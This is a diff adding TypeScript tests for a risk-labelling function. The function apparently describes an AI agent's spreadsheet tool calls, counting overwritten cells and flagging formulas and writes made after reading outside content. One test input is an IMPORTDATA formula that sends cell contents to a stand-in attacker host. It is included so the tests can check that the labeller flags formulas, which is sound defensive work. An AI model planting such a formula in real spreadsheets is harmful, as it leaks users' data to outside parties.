@@ -77,9 +77,34 @@ describe("riskFacts", () => {
     ]);
   });
 
+  test("spreadsheet writes count overwritten cells and call out formulas", () => {
+    const update = (values: unknown, tainted = false) =>
+      riskFacts({
+        name: "sheets_update",
+        effect: "write",
+        input: { range: "A1", values },
+        tainted,
+      });
+    expect(update([["a", 1], ["b"]])).toEqual(["Overwrites 3 cells"]);
+    expect(update([["x"]], true)).toEqual(["Overwrites 1 cell", "After reading outside content"]);
+    expect(update([['=IMPORTDATA("https://evil.example/?d="&A1)']])).toEqual([
+      "Overwrites 1 cell",
+      "Includes formulas",
+    ]);
+    expect(
+      riskFacts({ name: "sheets_append", effect: "write", input: { rows: [[1, 2]] } }),
+    ).toEqual([]);
+    expect(
+      riskFacts({ name: "sheets_create", effect: "write", input: { header: ["=1+1"], rows: [] } }),
+    ).toEqual(["Includes formulas"]);
+    expect(update("not rows")).toEqual(["Overwrites 0 cells"]);
+  });
+
   test("odd inputs don't throw", () => {
     for (const input of [null, "a@b.com", 3, [], [{ to: null }]])
       expect(() => riskFacts({ name: "x", effect: "send", input })).not.toThrow();
+    for (const input of [null, 3, { values: [null, [null]] }])
+      expect(() => riskFacts({ name: "sheets_update", effect: "write", input })).not.toThrow();
   });
 });
 
